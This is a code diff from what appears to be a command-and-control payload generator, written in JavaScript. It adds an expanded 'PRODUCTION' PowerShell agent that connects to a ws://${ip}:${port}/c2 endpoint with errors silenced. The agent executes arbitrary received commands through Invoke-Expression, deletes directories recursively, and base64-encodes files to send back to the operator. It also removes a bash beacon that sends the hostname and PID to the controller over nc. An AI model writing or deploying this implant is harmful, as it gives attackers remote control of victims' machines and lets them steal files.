@@ -234,42 +234,110 @@ ws.on('open', () => {
 });`,
 
     // ✅ PRODUCTION PowerShell - STABLE
-    powershell: `Add-Type -AssemblyName System.Net.WebSockets
-$ErrorActionPreference = 'SilentlyContinue'
-try {
-  $ws = New-Object System.Net.WebSockets.ClientWebSocket
-  $uri = New-Object Uri('ws://${ip}:${port}/c2')
-  $ct = New-Object System.Threading.CancellationToken
-  
-  $connected = $ws.ConnectAsync($uri, $ct).Wait(10000)
-  if ($ws.State -eq 'Open') {
-    while ($ws.State -eq 'Open') {
-      $buffer = New-Object byte[] 65536
-      $result = $ws.ReceiveAsync($buffer, $ct).Result
-      $msgJson = [Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
-      
-      try {
-        $msg = $msgJson | ConvertFrom-Json
-        if ($msg.type -eq 'ping') {
-          $ws.SendAsync(([Text.Encoding]::UTF8.GetBytes('{"type":"pong"}')), 1, $true, $ct) | Out-Null
-        } elseif ($msg.type -eq 'cmd') {
-          $output = & powershell -c $msg.cmd 2>&1 | Out-String
-          $resultJson = @{type='result'; data=$output} | ConvertTo-Json -Compress
-          $bytes = [Text.Encoding]::UTF8.GetBytes($resultJson)
-          $ws.SendAsync($bytes, 1, $true, $ct) | Out-Null
-        }
-      } catch {}
-      
-      Start-Sleep 2
-    }
-  }
-} catch {}`,
+    powershell: `$ErrorActionPreference = 'SilentlyContinue'
 
-    bash: `#!/bin/bash
-while true; do
-  echo '{"type":"beacon","hostname":"$(hostname)","pid":$$}' | nc -w2 ${ip} ${port} 2>/dev/null
-  sleep 5
-done`,
+try {
+    $ws = New-Object System.Net.WebSockets.ClientWebSocket
+    $uri = New-Object Uri("ws://${ip}:${port}/c2")
+    $ct = New-Object System.Threading.CancellationToken
+    
+    $connected = $ws.ConnectAsync($uri, $ct).Wait(10000)
+    if ($ws.State -eq 'Open') {
+        while ($ws.State -eq 'Open') {
+            $buffer = New-Object byte[] 65536
+            $result = $ws.ReceiveAsync($buffer, $ct).Result
+            if ($result.Count -gt 0) {
+                $msgJson = [Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
+                
+                try {
+                    $msg = $msgJson | ConvertFrom-Json
+                    if ($msg.type -eq 'ping') {
+                        $pong = @{type='pong'} | ConvertTo-Json -Compress
+                        $bytes = [Text.Encoding]::UTF8.GetBytes($pong)
+                        $ws.SendAsync($bytes, 1, $true, $ct) | Out-Null
+                    } 
+                    elseif ($msg.type -eq 'cmd') {
+                        $output = ""
+                        $cmd = $msg.cmd
+                        
+                        # Handle special commands first
+                        switch -Regex ($cmd) {
+                            '^cd\s+(.+)' { 
+                                $dir = $matches[1]
+                                try { 
+                                    Push-Location $dir -ErrorAction Stop 
+                                    $output = "Changed to: $(Get-Location)"
+                                } catch { 
+                                    $output = "Error: $_"
+                                }
+                            }
+                            '^mkdir\s+(.+)' { 
+                                $dir = $matches[1]
+                                try { 
+                                    New-Item -ItemType Directory -Path $dir -Force | Out-Null
+                                    $output = "Created directory: $dir"
+                                } catch { 
+                                    $output = "Error: $_"
+                                }
+                            }
+                            '^rmdir\s+(.+)' { 
+                                $dir = $matches[1]
+                                try { 
+                                    Remove-Item -Path $dir -Recurse -Force
+                                    $output = "Removed directory: $dir"
+                                } catch { 
+                                    $output = "Error: $_"
+                                }
+                            }
+                            '^upload\s+(.+)' { 
+                                # For file upload - receive file data in next message
+                                $output = "Ready for upload to: $($matches[1])"
+                            }
+                            '^download\s+(.+)' { 
+                                $file = $matches[1]
+                                try {
+                                    if (Test-Path $file) {
+                                        $bytes = [Convert]::ToBase64String([IO.File]::ReadAllBytes($file))
+                                        $output = @{type='file'; filename=$file; data=$bytes} | ConvertTo-Json -Compress
+                                    } else {
+                                        $output = "File not found: $file"
+                                    }
+                                } catch { 
+                                    $output = "Error: $_"
+                                }
+                            }
+                            default {
+                                # Execute raw command
+                                try {
+                                    $output = Invoke-Expression $cmd 2>&1 | Out-String
+                                } catch {
+                                    $output = "Error: $_"
+                                }
+                            }
+                        }
+                        
+                        # Send result back
+                        if ($output -is [string]) {
+                            $resultJson = @{type='result'; data=$output} | ConvertTo-Json -Compress
+                        } else {
+                            $resultJson = $output
+                        }
+                        $bytes = [Text.Encoding]::UTF8.GetBytes($resultJson)
+                        $ws.SendAsync($bytes, 1, $true, $ct) | Out-Null
+                    }
+                } catch {
+                    # Send error response
+                    $errorJson = @{type='error'; data="JSON parse error: $_"} | ConvertTo-Json -Compress
+                    $bytes = [Text.Encoding]::UTF8.GetBytes($errorJson)
+                    $ws.SendAsync($bytes, 1, $true, $ct) | Out-Null
+                }
+            }
+            Start-Sleep -Milliseconds 100
+        }
+    }
+} catch {
+    # Silent fail
+}`,
   };
 
   return {
